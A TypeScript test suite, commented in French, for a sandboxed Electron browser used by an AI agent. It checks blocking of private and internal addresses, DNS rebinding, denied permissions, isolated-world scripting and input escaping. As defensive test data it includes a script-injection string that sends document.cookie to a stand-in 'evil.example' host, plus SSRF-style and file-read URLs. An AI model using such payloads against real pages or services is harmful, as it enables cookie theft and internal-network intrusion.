/**
 * SPECS-P5-UI-PARITE.md §6 — navigateur de l'agent : la POLITIQUE (quelles adresses, quelles requêtes, quel durcissement de la fenêtre) est
 * testée ici avec un faux Electron ; le comportement du vrai DOM l'est par le smoke Electron (`browser.e2e.test.ts`).
 */
import { describe, expect, it } from "vitest";
import { AgentBrowser, checkBrowserUrl, type ElectronBits, isPrivateHost } from "./agent-browser.ts";

describe("isPrivateHost", () => {
  it.each([
    "localhost", "LOCALHOST", "app.localhost", "imprimante.local", "nas.lan", "svc.internal", "x.home.arpa", "localhost.",
    "127.0.0.1", "127.1.2.3", "0.0.0.0", "10.0.0.5", "172.16.0.1", "172.31.255.255", "192.168.1.1", "169.254.169.254", "100.64.0.1", "198.18.0.1", "224.0.0.1", "255.255.255.255",
    "::1", "::", "[::1]", "fe80::1", "fd12:3456::1", "fc00::1", "ff02::1", "::ffff:127.0.0.1", "::ffff:7f00:1", "::ffff:a00:1",
    "",
  ])("%s est local ou interne", (h) => expect(isPrivateHost(h)).toBe(true));

  it.each(["example.org", "8.8.8.8", "93.184.216.34", "172.15.0.1", "172.32.0.1", "100.63.0.1", "100.128.0.1", "2606:4700::1111", "::ffff:8.8.8.8", "localhost.example.org"])("%s est public", (h) => expect(isPrivateHost(h)).toBe(false));
});

describe("checkBrowserUrl", () => {
  it("n'accepte que http(s) vers le web public, sans identifiants", () => {
    expect(checkBrowserUrl(" https://example.org/a?b=1 ").href).toBe("https://example.org/a?b=1");
    for (const bad of ["file:///C:/Windows/win.ini", "ftp://example.org", "javascript:alert(1)", "data:text/html,<h1>x</h1>", "chrome://settings", "devtools://x", "about:blank", "blob:https://example.org/x", "example.org", "", "http://"]) {
      expect(() => checkBrowserUrl(bad), bad).toThrow(/invalide|refusée/);
    }
    expect(() => checkBrowserUrl("https://user:pass@example.org")).toThrow(/identifiants/);
  });

  it("refuse la machine et le réseau local, y compris sous les formes déguisées que `URL` normalise", () => {
    for (const bad of ["http://localhost:8080", "http://127.0.0.1", "http://[::1]/", "http://192.168.0.1/admin", "http://10.0.0.1", "http://169.254.169.254/latest/meta-data", "http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/", "http://127.1/", "http://[::ffff:127.0.0.1]/", "http://app.localhost"]) {
      expect(() => checkBrowserUrl(bad), bad).toThrow(/local ou interne/);
    }
    expect(checkBrowserUrl("http://127.0.0.1:9", true).hostname).toBe("127.0.0.1"); // le mode test seul l'ouvre
  });
});

/** Faux Electron : enregistre ce que `AgentBrowser` configure, sans fenêtre réelle. */
function fakeElectron(onScript?: (code: string) => unknown) {
  const log: {
    windows: Record<string, unknown>[]; shown: string[]; loaded: string[]; scripts: { world: number; code: string }[]; destroyed: number; cleared: number;
    backTo?: number; debuggerAttached: boolean; attachedWith: string[]; inputs: Record<string, unknown>[]; partitions: string[]; clearedBy: string[]; sessions: number; canGoBack: boolean; wentBack: number;
  } = {
    windows: [], shown: [], loaded: [], scripts: [], destroyed: 0, cleared: 0, debuggerAttached: false, attachedWith: [], inputs: [], partitions: [], clearedBy: [], sessions: 0, canGoBack: true, wentBack: 0,
  };
  let beforeRequest: ((d: { url: string }, cb: (r: { cancel: boolean }) => void) => void) | null = null;
  let permission: ((...a: unknown[]) => void) | null = null;
  let permissionCheck: (() => boolean) | null = null;
  let willDownload: ((e: { preventDefault(): void }) => void) | null = null;
  let openHandler: ((d: { url: string }) => { action: "deny" }) | null = null;
  let currentUrl = "about:blank";
  const makeSession = (name: string) => ({
    setPermissionRequestHandler: (h: (...a: unknown[]) => void) => void (permission = h),
    setPermissionCheckHandler: (h: () => boolean) => void (permissionCheck = h),
    on: (_e: "will-download", h: (e: { preventDefault(): void }) => void) => void (willDownload = h),
    webRequest: { onBeforeRequest: (h: typeof beforeRequest) => void (beforeRequest = h) },
    clearStorageData: async () => void (log.cleared++, log.clearedBy.push(name)),
    clearCache: async () => {},
  });
  const sessions = new Map<string, ReturnType<typeof makeSession>>();
  const sessionFor = (name: string) => {
    if (!sessions.has(name)) {
      log.sessions++;
      sessions.set(name, makeSession(name));
    }
    return sessions.get(name)!;
  };
  class FakeWindow {
    destroyed = false;
    webContents = {
      loadURL: async (u: string) => void (log.loaded.push(u), (currentUrl = u)),
      stop: () => {},
      isLoading: () => false,
      getURL: () => currentUrl,
      getTitle: () => "Titre",
      executeJavaScriptInIsolatedWorld: async (world: number, scripts: { code: string }[]) => {
        log.scripts.push({ world, code: scripts[0]!.code });
        return onScript ? onScript(scripts[0]!.code) : { url: "http://page-injectee.example/", title: "T", text: "texte", elements: [{ index: 0, tag: "a", type: "", label: "L", href: "https://e.org" }] };
      },
      setWindowOpenHandler: (h: typeof openHandler) => void (openHandler = h),
      once: () => {},
      removeListener: () => {},
      setUserAgent: () => {},
      getUserAgent: () => "Mozilla/5.0 Chrome/140 Electron/44.4.5 Safari/537.36",
      focus: () => {},
      debugger: {
        isAttached: () => log.debuggerAttached,
        attach: (v: string) => void ((log.debuggerAttached = true), log.attachedWith.push(v)),
        sendCommand: async (method: string, params: unknown) => void log.inputs.push({ method, ...(params as Record<string, unknown>) }),
      },
      navigationHistory: { getActiveIndex: () => (log.canGoBack ? 3 : 0), goToIndex: (i: number) => void ((log.wentBack += 1), (log.backTo = i)) },
    };
    constructor(o: Record<string, unknown>) {
      log.windows.push(o);
    }
    show() {
      log.shown.push("show");
    }
    showInactive() {
      log.shown.push("showInactive");
    }
    focus() {
      log.shown.push("focus");
    }
    hide() {
      log.shown.push("hide");
    }
    destroy() {
      this.destroyed = true;
      log.destroyed++;
    }
    isDestroyed() {
      return this.destroyed;
    }
    on() {}
  }
  const electron = { BrowserWindow: FakeWindow, session: { fromPartition: (name: string) => ((log as Record<string, unknown>).partition = name, log.partitions.push(name), sessionFor(name)) } } as unknown as ElectronBits;
  return {
    electron,
    log: log as typeof log & { partition?: string },
    permission: () => permission!,
    permissionCheck: () => permissionCheck!,
    willDownload: () => willDownload!,
    openHandler: () => openHandler!,
    request: (url: string) => new Promise<boolean>((ok) => beforeRequest!({ url }, (r) => ok(!r.cancel))),
  };
}

const publicLookup = async (host: string) => (host === "rebind.example" ? ["127.0.0.1"] : host === "mixed.example" ? ["93.184.216.34", "10.0.0.1"] : ["93.184.216.34"]);

describe("AgentBrowser (faux Electron)", () => {
  it("fenêtre durcie : session en mémoire, sans Node, isolée, bac à sable ; cachée si browserVisible est faux, montrée SANS prendre le focus sinon", async () => {
    const f = fakeElectron();
    let visible = true;
    const b = new AgentBrowser({ electron: f.electron, visible: () => visible, lookup: publicLookup });
    await b.open("https://example.org");
    expect(f.log.partition).toBe("jarod-agent-browser"); // pas de « persist: » : mémoire seulement
    expect(f.log.windows[0]!.webPreferences).toMatchObject({ nodeIntegration: false, contextIsolation: true, sandbox: true, webSecurity: true, allowRunningInsecureContent: false });
    expect(f.log.windows[0]!.webPreferences).not.toHaveProperty("preload");
    expect(f.log.shown).toEqual(["showInactive"]);
    visible = false;
    await b.open("https://example.org/2");
    expect(f.log.shown).toEqual(["showInactive", "hide"]);
    expect(f.log.windows).toHaveLength(1); // une seule fenêtre réutilisée
  });

  it("adresses refusées AVANT toute fenêtre : locales, déguisées, et noms publics qui pointent vers le privé (DNS) — même si une seule des adresses l'est", async () => {
    const f = fakeElectron();
    const b = new AgentBrowser({ electron: f.electron, visible: () => true, lookup: publicLookup });
    await expect(b.open("http://localhost")).rejects.toThrow(/local ou interne/);
    await expect(b.open("file:///etc/passwd")).rejects.toThrow(/non autorisé/);
    await expect(b.open("http://rebind.example/")).rejects.toThrow(/pointe vers une adresse locale/);
    await expect(b.open("http://mixed.example/")).rejects.toThrow(/pointe vers une adresse locale/);
    expect(f.log.windows).toHaveLength(0);
    expect(f.log.loaded).toEqual([]);
  });

  it("chaque requête de la page est contrôlée : web public oui ; privé, file:, DNS piégé, protocoles inconnus non ; data:/blob: internes oui", async () => {
    const f = fakeElectron();
    const b = new AgentBrowser({ electron: f.electron, visible: () => true, lookup: publicLookup });
    await b.open("https://example.org");
    const allowed = async (u: string) => f.request(u);
    expect(await allowed("https://cdn.example.org/a.js")).toBe(true);
    expect(await allowed("wss://example.org/socket")).toBe(true);
    expect(await allowed("data:image/png;base64,AAAA")).toBe(true);
    expect(await allowed("blob:https://example.org/uuid")).toBe(true);
    for (const bad of ["http://127.0.0.1:8642/v1/chat", "http://localhost:11434/api", "http://192.168.1.1/", "http://169.254.169.254/", "http://[::1]/", "ws://127.0.0.1:10492/", "http://rebind.example/x", "file:///C:/secret.txt", "ftp://example.org/", "chrome://gpu", "not a url"]) {
      expect(await allowed(bad), bad).toBe(false);
    }
  });

  it("permissions toutes refusées, téléchargements annulés, window.open ne crée pas de fenêtre (adresse chargée ici si permise, sinon ignorée)", async () => {
    const f = fakeElectron();
    const b = new AgentBrowser({ electron: f.electron, visible: () => true, lookup: publicLookup });
    await b.open("https://example.org");
    let granted: boolean | null = null;
    f.permission()({}, "media", (ok: boolean) => (granted = ok));
    expect(granted).toBe(false);
    expect(f.permissionCheck()()).toBe(false);
    let prevented = false;
    f.willDownload()({ preventDefault: () => (prevented = true) });
    expect(prevented).toBe(true);
    expect(f.openHandler()({ url: "https://example.org/popup" })).toEqual({ action: "deny" });
    expect(f.openHandler()({ url: "http://127.0.0.1/popup" })).toEqual({ action: "deny" });
    await new Promise((r) => setTimeout(r, 5));
    expect(f.log.loaded).toEqual(["https://example.org/", "https://example.org/popup"]); // l'adresse locale n'a jamais été chargée
  });

  it("les scripts de l'application tournent dans un MONDE ISOLÉ ; l'adresse rendue est celle de Chromium, pas celle que la page déclare", async () => {
    const f = fakeElectron();
    const b = new AgentBrowser({ electron: f.electron, visible: () => true, lookup: publicLookup });
    const snap = await b.open("https://example.org/vrai");
    expect(f.log.scripts.length).toBeGreaterThan(0);
    expect(new Set(f.log.scripts.map((s) => s.world)).size).toBe(1);
    expect(f.log.scripts[0]!.world).toBeGreaterThan(0); // 0 = monde de la page : jamais
    expect(snap.url).toBe("https://example.org/vrai"); // la page injectée prétendait « http://page-injectee.example/ »
  });

  it("saisie : le texte passe en littéral JSON (aucune injection de script), l'index est un entier, mot de passe refusé par le script ; erreur du script remontée", async () => {
    const f = fakeElectron((code) => (code.includes("password") && code.includes("__jarodEls") && !code.includes("window.__jarodEls = els") ? { ok: true } : { url: "u", title: "t", text: "x", elements: [] }));
    const b = new AgentBrowser({ electron: f.electron, visible: () => true, lookup: publicLookup });
    await b.open("https://example.org");
    const evil = '");fetch("http://evil.example/?"+document.cookie);("';
    await b.type(2, evil, true);
    const code = f.log.scripts.find((s) => s.code.includes("requestSubmit"))!.code;
    expect(code).toContain(JSON.stringify(evil)); // le texte est UN littéral de chaîne
    expect(code).toContain("(window.__jarodEls || [])[2]");
    expect(code).toContain("champ de mot de passe");
    const g = fakeElectron((code) => (code.includes("window.__jarodEls = els") ? { url: "u", title: "t", text: "x", elements: [] } : { error: "élément introuvable : relisez la page" }));
    const c = new AgentBrowser({ electron: g.electron, visible: () => true, lookup: publicLookup });
    await c.open("https://example.org");
    await expect(c.click(9)).rejects.toThrow(/élément introuvable/);
    await expect(c.read()).resolves.toMatchObject({ text: "x" });
  });

  it("sans page ouverte : read/click/type disent d'utiliser browser_open ; close détruit la fenêtre et efface la session ; une fenêtre fermée est recréée", async () => {
    const f = fakeElectron();
    const b = new AgentBrowser({ electron: f.electron, visible: () => true, lookup: publicLookup });
    await expect(b.read()).rejects.toThrow(/browser_open/);
    await expect(b.click(0)).rejects.toThrow(/browser_open/);
    await b.open("https://example.org");
    await b.close();
    expect(f.log.destroyed).toBe(1);
    expect(f.log.cleared).toBe(1);
    await expect(b.read()).rejects.toThrow(/browser_open/);
    await b.open("https://example.org");
    expect(f.log.windows).toHaveLength(2);
  });

  it("opérations sérialisées : deux appels simultanés ne s'entrelacent pas", async () => {
    const order: string[] = [];
    const f = fakeElectron(() => {
      order.push("script");
      return { url: "u", title: "t", text: "x", elements: [] };
    });
    const b = new AgentBrowser({ electron: f.electron, visible: () => true, lookup: publicLookup });
    await b.open("https://example.org");
    order.length = 0;
    await Promise.all([b.read(), b.read(), b.read()]);
    expect(order).toEqual(["script", "script", "script"]);
  });
});

describe("AgentBrowser : actions du clavier, défilement, retour, attente, relais, session persistante", () => {
  const make = (over: { onScript?: (code: string) => unknown; persistent?: () => boolean; visible?: () => boolean } = {}) => {
    const f = fakeElectron(over.onScript);
    const b = new AgentBrowser({ electron: f.electron, settleScale: 0.02, visible: over.visible ?? (() => true), ...(over.persistent ? { persistent: over.persistent } : {}), lookup: publicLookup });
    return { f, b };
  };

  it("press : un script du monde isolé pour chaque touche de la liste fermée (événements clavier + action par défaut) ; toute autre touche refusée, aucun script", async () => {
    const { f, b } = make();
    await b.open("https://example.org");
    const keyScripts = () => f.log.scripts.filter((s) => s.code.includes("new KeyboardEvent('keydown'")).map((s) => s.code);
    await b.press("Enter");
    const enter = keyScripts()[0]!;
    expect(f.log.scripts.at(-2)!.world).toBeGreaterThan(0); // monde isolé, jamais celui de la page
    expect(enter).toContain('const name = "Enter";');
    expect(enter).toContain("keyCode: 13");
    expect(enter).toContain("requestSubmit"); // l'action par défaut : valider le formulaire du champ actif
    await b.press("ArrowDown");
    expect(keyScripts()[1]).toContain('const name = "ArrowDown";');
    expect(keyScripts()[1]).toContain("keyCode: 40");
    const before = f.log.scripts.length;
    for (const bad of ["Control+C", "F12", "Meta", "enter", "", "a", "'; alert(1); '"]) await expect(b.press(bad)).rejects.toThrow(/Touche refusée/);
    expect(f.log.scripts.length).toBe(before); // rien n'a tourné
    await expect(make().b.press("Enter")).rejects.toThrow(/browser_open/);
  });

  it("tous les scripts injectés sont du JavaScript VALIDE (compilés, pas exécutés) : une faute de syntaxe ne se verrait sinon que dans le vrai navigateur", async () => {
    const { f, b } = make();
    await b.open("https://example.org");
    for (const k of ["Enter", "Tab", "Escape", "Backspace", "Delete", "Space", "ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight", "PageUp", "PageDown", "Home", "End"]) await b.press(k);
    for (const d of ["down", "up", "top", "bottom"] as const) await b.scroll(d);
    await b.click(0);
    await b.type(0, "texte avec 'apostrophes', \"guillemets\" et \n sauts", true);
    await b.type(0, "sans envoi", false);
    await b.wait(1, "un texte");
    const codes = [...new Set(f.log.scripts.map((s) => s.code))];
    expect(codes.length).toBeGreaterThan(20);
    for (const code of codes) expect(() => new Function(`return ${code}`), code.slice(0, 80)).not.toThrow();
  }, 20_000);

  it("scroll : un script de la liste (jamais un texte libre) dans le monde isolé ; direction inconnue refusée", async () => {
    const { f, b } = make();
    await b.open("https://example.org");
    f.log.scripts.length = 0;
    await b.scroll("down");
    await b.scroll("top");
    await b.scroll("bottom");
    const code = f.log.scripts.map((s) => s.code).filter((c) => c.startsWith("window.scroll"));
    expect(code.map((c) => c.split(";")[0])).toEqual(["window.scrollBy(0, Math.round(window.innerHeight * 0.85))", "window.scrollTo(0, 0)", "window.scrollTo(0, document.documentElement.scrollHeight)"]);
    // Fenêtre cachée : pas de rendu, donc pas d'événement `scroll` natif — il est émis pour les pages qui chargent en défilant.
    for (const c of code) expect(c).toContain("dispatchEvent(new Event('scroll'))");
    await expect(b.scroll("left" as never)).rejects.toThrow(/Direction refusée/);
    await expect(b.scroll("'; alert(1); '" as never)).rejects.toThrow(/Direction refusée/);
  });

  it("back : revient si l'historique le permet, sinon le dit", async () => {
    const { f, b } = make();
    await b.open("https://example.org");
    await b.back();
    expect(f.log.wentBack).toBe(1);
    expect(f.log.backTo).toBe(2); // l'entrée juste avant l'active, par son rang
    f.log.canGoBack = false;
    await expect(b.back()).rejects.toThrow(/Pas de page précédente/);
    expect(f.log.wentBack).toBe(1);
  });

  it("wait : attend un texte (le littéral est JSON, jamais du script) et rend la page dès qu'il paraît ; sans texte, patiente", async () => {
    let probes = 0;
    const { f, b } = make({
      onScript: (code) => {
        if (code.includes(".includes(")) return ++probes >= 3; // le texte paraît à la 3e sonde
        return { url: "u", title: "t", text: "résultat", elements: [] };
      },
    });
    await b.open("https://example.org");
    const evil = '");fetch("http://evil.example");("';
    const t0 = Date.now();
    const snap = await b.wait(5, evil);
    expect(Date.now() - t0).toBeLessThan(3000);
    expect(probes).toBe(3);
    expect(snap.text).toBe("résultat");
    expect(f.log.scripts.find((s) => s.code.includes(".includes("))!.code).toContain(JSON.stringify(evil));
    const t1 = Date.now();
    await b.wait(1);
    expect(Date.now() - t1).toBeGreaterThanOrEqual(900);
  }, 15_000);

  it("reveal : la fenêtre se montre au premier plan MÊME si browserVisible est faux", async () => {
    const { f, b } = make({ visible: () => false });
    await b.open("https://example.org");
    expect(f.log.shown).toEqual(["hide"]);
    await b.reveal();
    expect(f.log.shown).toEqual(["hide", "show", "focus"]);
  });

  it("session : en mémoire par défaut (close l'efface) ; persistante sur demande, sur sa propre partition (close la GARDE) ; forget efface les deux ; changer le réglage recrée la fenêtre", async () => {
    let persistent = false;
    const { f, b } = make({ persistent: () => persistent });
    await b.open("https://example.org");
    expect(f.log.partitions).toEqual(["jarod-agent-browser"]);
    await b.close();
    expect(f.log.clearedBy).toEqual(["jarod-agent-browser"]);

    persistent = true;
    await b.open("https://example.org");
    expect(f.log.partitions.at(-1)).toBe("persist:jarod-agent-browser");
    expect(f.log.partitions.at(-1)).not.toBe("persist:jarod"); // jamais la session de l'application
    f.log.clearedBy.length = 0;
    await b.close();
    expect(f.log.clearedBy).toEqual([]); // les connexions sont gardées

    await b.open("https://example.org");
    await b.forget();
    expect(f.log.clearedBy.sort()).toEqual(["jarod-agent-browser", "persist:jarod-agent-browser"]);
    await expect(b.read()).rejects.toThrow(/browser_open/);

    // Le réglage change pendant que la fenêtre est ouverte : la fenêtre repart sur la bonne session.
    await b.open("https://example.org");
    const windows = f.log.windows.length;
    persistent = false;
    await b.open("https://example.org/2");
    expect(f.log.windows.length).toBe(windows + 1);
    expect(f.log.partitions.at(-1)).toBe("jarod-agent-browser");
  });

  it("les gardes de session ne sont posés qu'une fois par session, même après plusieurs fenêtres", async () => {
    const { f, b } = make();
    await b.open("https://example.org");
    await b.close();
    await b.open("https://example.org");
    await b.close();
    await b.open("https://example.org");
    expect(f.log.sessions).toBe(1);
    expect(f.log.windows).toHaveLength(3);
  });
});
